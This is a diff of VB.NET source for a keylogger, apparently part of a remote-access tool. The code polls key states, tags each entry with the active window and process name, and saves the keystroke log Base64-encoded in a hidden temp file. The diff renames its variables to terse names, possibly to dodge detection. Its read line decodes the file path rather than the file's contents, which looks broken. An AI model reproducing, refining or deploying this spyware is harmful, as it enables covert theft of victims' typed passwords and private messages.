@@ -17,9 +17,10 @@ Public Class Main
     Public Declare Function GetForegroundWindow Lib "user32" () As IntPtr
     Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
 #End Region
-    Public Shared LastAV As Integer ' Last Active Window Handle
-    Public Shared LastAS As String ' Last Active Window Title
-    Public Shared lastKey As Windows.Forms.Keys = Nothing ' Last Pressed Key
+
+    Public Shared LAW As Integer ' Last Active Window Handle
+    Public Shared LAT As String ' Last Active Window Title
+    Public Shared LK As Windows.Forms.Keys = Nothing ' Last Pressed Key
 
     Public Shared Function AV() As String ' Get Active Window
         Try
@@ -27,27 +28,27 @@ Public Class Main
             Dim id As Integer
             GetWindowThreadProcessId(o, id)
             Dim p As Object = Diagnostics.Process.GetProcessById(id)
-            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
+            If o.ToInt32 = LAW And LAT = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
             Else
 
-                LastAV = o.ToInt32
-                LastAS = p.MainWindowTitle
-                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LastAS & ChrW(1) & vbNewLine
+                LAW = o.ToInt32
+                LAT = p.MainWindowTitle
+                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LAT & ChrW(1) & vbNewLine
             End If
         Catch ex As Exception
         End Try
         Return ""
     End Function
-    Public Shared Clock As New Microsoft.VisualBasic.Devices.Clock
+    Public Shared _Time As New Microsoft.VisualBasic.Devices.Clock
     Public Shared Function HM() As String
         Try
-            Return Clock.LocalTime.ToString("yy/MM/dd")
+            Return _Time.LocalTime.ToString("yy/MM/dd")
         Catch ex As Exception
             Return "??/??/??"
         End Try
     End Function
     Public Shared Logs As String = ""
-    Public Shared keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
+    Public Shared KYB As Object = New Microsoft.VisualBasic.Devices.Keyboard
     Public Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
         Try
             Dim sbString As New System.Text.StringBuilder()
@@ -69,8 +70,8 @@ Public Class Main
         Return CType(VKCode, Windows.Forms.Keys).ToString
     End Function
     Public Shared Function Fix(ByVal k As Windows.Forms.Keys) As String
-        Dim isuper As Boolean = keyboard.ShiftKeyDown
-        If keyboard.CapsLock = True Then
+        Dim isuper As Boolean = KYB.ShiftKeyDown
+        If KYB.CapsLock = True Then
             If isuper = True Then
                 isuper = False
             Else
@@ -109,11 +110,11 @@ Public Class Main
     End Function
 
 
-    Public Shared LogsPath As String = IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"
+    Public Shared _KLG As String = IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"
     Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         Try
-            Logs = (IO.File.ReadAllText(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(LogsPath))))
+            Logs = (IO.File.ReadAllText(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(_KLG))))
 
         Catch ex As Exception
         End Try
@@ -130,7 +131,7 @@ Public Class Main
                             Logs &= AV()
                             Logs &= s
                         End If
-                        lastKey = kk
+                        LK = kk
                     End If
                 Next
                 If lp = 1000 Then
@@ -139,7 +140,7 @@ Public Class Main
                     If Logs.Length > mx Then
                         Logs = Logs.Remove(0, Logs.Length - mx)
                     End If
-                    IO.File.WriteAllText(LogsPath, Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Logs)))
+                    IO.File.WriteAllText(_KLG, Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Logs)))
                 End If
                 Threading.Thread.CurrentThread.Sleep(1)
 
